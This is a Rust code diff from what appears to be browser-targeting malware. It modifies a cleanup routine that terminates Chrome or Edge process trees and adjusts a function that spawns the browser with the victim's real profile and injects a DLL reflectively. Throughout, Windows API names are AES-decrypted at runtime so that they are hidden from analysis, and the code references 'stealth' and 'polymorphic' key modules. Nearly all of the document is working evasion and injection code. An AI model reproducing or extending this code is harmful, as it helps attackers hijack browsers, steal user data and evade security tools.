@@ -63,31 +63,86 @@ impl Cleanup {
 
 impl Drop for Cleanup {
     fn drop(&mut self) {
-        if let Some(pid) = self.spawned_pid.take() {
-            unsafe {
-                let k32 = crate::syscall::get_module_base(crate::stealth::stealth_dll_name(0));
-                if let Some(base) = k32 {
-                    let open_name = aes_decrypt(&polymorphic_keys::OPEN_PROC_ENC, &polymorphic_keys::OPEN_PROC_KEY, &polymorphic_keys::OPEN_PROC_NONCE);
-                    let term_name = aes_decrypt(&polymorphic_keys::TERM_PROC_ENC, &polymorphic_keys::TERM_PROC_KEY, &polymorphic_keys::TERM_PROC_NONCE);
-                    let close_name = aes_decrypt(&polymorphic_keys::CLOSE_H_ENC, &polymorphic_keys::CLOSE_H_KEY, &polymorphic_keys::CLOSE_H_NONCE);
-                    if let Some(open_fn) = crate::syscall::resolve_export(base, core::str::from_utf8_unchecked(&open_name)) {
-                        let open: unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void = std::mem::transmute(open_fn);
-                        let proc = open(0x0001, 0, pid);
-                        if !proc.is_null() {
-                            if let Some(term_fn) = crate::syscall::resolve_export(base, core::str::from_utf8_unchecked(&term_name)) {
-                                let term: unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> i32 = std::mem::transmute(term_fn);
-                                term(proc, 0xC0000005u32);
-                            }
-                            if let Some(close_fn) = crate::syscall::resolve_export(base, core::str::from_utf8_unchecked(&close_name)) {
-                                let close: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32 = std::mem::transmute(close_fn);
-                                close(proc);
-                            }
-                        }
-                    }
-                }
+        // Kill all processes spawned by us: the root pid and all its descendants.
+        // Chrome/Edge spawn many child processes (renderer, GPU, network service…)
+        // that must all be terminated, not just the parent.
+        if let Some(root_pid) = self.spawned_pid.take() {
+            kill_process_tree(root_pid);
+        }
+        // If we only have the exe name (injected into existing process), kill by name.
+        // kill_browsers() in extract_for_browser handles this case — nothing extra needed.
+        for f in &self.files { let _ = fs::remove_file(f); }
+    }
+}
+
+/// Kill a process and all its descendants by walking the snapshot PPID tree.
+fn kill_process_tree(root_pid: u32) {
+    use std::ffi::c_void;
+    #[repr(C)]
+    #[derive(Clone)]
+    struct PE32W { dw_size: u32, cnt_usage: u32, th32_process_id: u32, th32_default_heap_id: usize,
+                   th32_module_id: u32, cnt_threads: u32, th32_parent_process_id: u32,
+                   pc_pri_class_base: i32, dw_flags: u32, sz_exe_file: [u16; 260] }
+    unsafe {
+        let k32 = match crate::syscall::get_module_base(crate::stealth::stealth_dll_name(0)) {
+            Some(b) => b, None => return,
+        };
+        let cs_n = aes_decrypt(&polymorphic_keys::CTX_SNAP_ENC,  &polymorphic_keys::CTX_SNAP_KEY,  &polymorphic_keys::CTX_SNAP_NONCE);
+        let pf_n = aes_decrypt(&polymorphic_keys::P32_FIRST_ENC, &polymorphic_keys::P32_FIRST_KEY, &polymorphic_keys::P32_FIRST_NONCE);
+        let pn_n = aes_decrypt(&polymorphic_keys::P32_NEXT_ENC,  &polymorphic_keys::P32_NEXT_KEY,  &polymorphic_keys::P32_NEXT_NONCE);
+        let op_n = aes_decrypt(&polymorphic_keys::OPEN_PROC_ENC, &polymorphic_keys::OPEN_PROC_KEY, &polymorphic_keys::OPEN_PROC_NONCE);
+        let tp_n = aes_decrypt(&polymorphic_keys::TERM_PROC_ENC, &polymorphic_keys::TERM_PROC_KEY, &polymorphic_keys::TERM_PROC_NONCE);
+        let ch_n = aes_decrypt(&polymorphic_keys::CLOSE_H_ENC,   &polymorphic_keys::CLOSE_H_KEY,   &polymorphic_keys::CLOSE_H_NONCE);
+
+        let cs: unsafe extern "system" fn(u32, u32) -> *mut c_void =
+            match crate::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&cs_n)) { Some(f) => std::mem::transmute(f), None => return };
+        let pf: unsafe extern "system" fn(*mut c_void, *mut PE32W) -> i32 =
+            match crate::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&pf_n)) { Some(f) => std::mem::transmute(f), None => return };
+        let pn: unsafe extern "system" fn(*mut c_void, *mut PE32W) -> i32 =
+            match crate::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&pn_n)) { Some(f) => std::mem::transmute(f), None => return };
+        let op: unsafe extern "system" fn(u32, i32, u32) -> *mut c_void =
+            match crate::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&op_n)) { Some(f) => std::mem::transmute(f), None => return };
+        let tp: unsafe extern "system" fn(*mut c_void, u32) -> i32 =
+            match crate::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&tp_n)) { Some(f) => std::mem::transmute(f), None => return };
+        let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
+            match crate::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&ch_n)) { Some(f) => std::mem::transmute(f), None => return };
+
+        let snap = cs(0x00000002, 0); // TH32CS_SNAPPROCESS
+        if snap.is_null() || snap as isize == -1 { return; }
+
+        // Collect all (pid, ppid) pairs
+        let mut entries: Vec<(u32, u32)> = Vec::new();
+        let mut entry: PE32W = std::mem::zeroed();
+        entry.dw_size = std::mem::size_of::<PE32W>() as u32;
+        if pf(snap, &mut entry) != 0 {
+            loop {
+                entries.push((entry.th32_process_id, entry.th32_parent_process_id));
+                if pn(snap, &mut entry) == 0 { break; }
             }
         }
-        for f in &self.files { let _ = fs::remove_file(f); }
+        ch(snap);
+
+        // BFS to collect all descendants of root_pid
+        let mut to_kill: Vec<u32> = vec![root_pid];
+        let mut i = 0;
+        while i < to_kill.len() {
+            let parent = to_kill[i];
+            for &(pid, ppid) in &entries {
+                if ppid == parent && pid != 0 && !to_kill.contains(&pid) {
+                    to_kill.push(pid);
+                }
+            }
+            i += 1;
+        }
+
+        // Kill in reverse order (children before parent)
+        for &pid in to_kill.iter().rev() {
+            let h = op(0x0001, 0, pid); // PROCESS_TERMINATE
+            if !h.is_null() {
+                tp(h, 1);
+                ch(h);
+            }
+        }
     }
 }
 
@@ -394,14 +449,6 @@ unsafe fn inject_dll_reflective_inner(proc: *mut std::ffi::c_void, dll_data: &[u
 
 fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Path) -> Result<u32, ()> {
     let profile_str = real_profile.to_string_lossy();
-    let chrome_default = aes_decrypt(&polymorphic_keys::INJ_CHROME_EXE_ENC, &polymorphic_keys::INJ_CHROME_EXE_KEY, &polymorphic_keys::INJ_CHROME_EXE_NONCE);
-    let chrome_default = String::from_utf8_lossy(&chrome_default).into_owned();
-    let exe_name = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or(chrome_default);
-
-    for pid in find_browser_pids(&exe_name) {
-        let dll_bytes = fs::read(dll_path).unwrap_or_default();
-        if inject_dll_reflective(pid, &dll_bytes).is_ok() { return Ok(pid); }
-    }
 
     let mut parts: Vec<String> = Vec::new();
     parts.push(format!("\"{chrome_exe}\""));
@@ -464,7 +511,8 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
         let pid = pi.dwProcessId;
 
         // Edge needs more startup time than Chrome — poll with early exit
-        let wait_ms = if exe_name.eq_ignore_ascii_case("msedge.exe") { 5000u64 } else { 3000u64 };
+        let exe_basename = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_lowercase()).unwrap_or_default();
+        let wait_ms = if exe_basename == "msedge.exe" { 5000u64 } else { 3000u64 };
         let step = 500u64;
         let mut elapsed = 0u64;
         while elapsed < wait_ms {
